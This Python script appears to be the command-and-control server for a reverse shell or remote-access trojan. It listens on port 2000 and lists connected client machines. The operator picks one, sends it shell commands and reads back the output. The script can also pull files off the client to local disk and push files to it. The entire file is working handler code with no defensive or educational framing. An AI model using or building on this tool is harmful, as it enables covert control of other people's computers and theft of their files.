#!/usr/bin/env python3

import sys
import time
import socket
from socket import AF_INET, SOCK_STREAM
from common import pr, clear, Send, Receive

# server socket
server = socket.socket(AF_INET, SOCK_STREAM)
server.bind(('', 2000))
server.listen()
server.settimeout(10)

# client sockets
socks = []
clients = []
active = False

def close(sock, client):
  socks.remove(sock)
  clients.remove(client)
  sock.close()

def refresh():
  pr('Listening for clients...')

  if not clients:
    return

  for i in range(0, len(clients)):
    pr('➡️ Client %d: %s' % (i, clients[i]))

  pr('Press Ctrl+C to interact with client.')

while True:
  refresh()

  try:
    try:
      s, a = server.accept()
    except socket.timeout:
      continue
    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))
    clear()
    refresh()

  except KeyboardInterrupt:
    pr('\r')
    activate = int(input('Enter option: '))

    if activate == -1:
      sys.exit()
    
    Send(socks[activate], 'activate')
    pr('Activating client ' + str(activate))

    sock = socks[activate]
    client = clients[activate]
    active = True

  while active:
    try:
      data = Receive(sock)
    except:
      active = False
      pr('Client %s disconnected.' % client)
      close(sock, client)
      break

    # ⬇️ dl file
    if data.endswith(b'FILEXXX'):
      data = data[:-7].split(b'FILENAMEXXX')
      d = b''.join(data[:-1])
      fn = data[-1].decode() # to str
      try:
        f = open(fn, 'wb')
      except IOError:
        print('Error opening file')
      f.write(d)
      f.close()
      continue # recv more

    else:
      print(data.decode(), end='')

    # TODO: cmd empty
    nc = input()
    nc = nc.strip()

    if nc == '-1':
      active = False
      Send(sock, 'deactivate')
      time.sleep(1)
      close(sock, client)
      break

    # ⬆️ ul file
    elif nc.startswith('ul '):
      fn = nc[3:]
      try:
        f = open(fn, 'rb')
      except IOError:
        print('Error opening file')
      d = f.read()
      f.close()
      d += b'FILENAMEXXX%sFILEXXX' % fn.encode()
      Send(sock, d)
      time.sleep(1)
    
    else:
      Send(sock, nc)
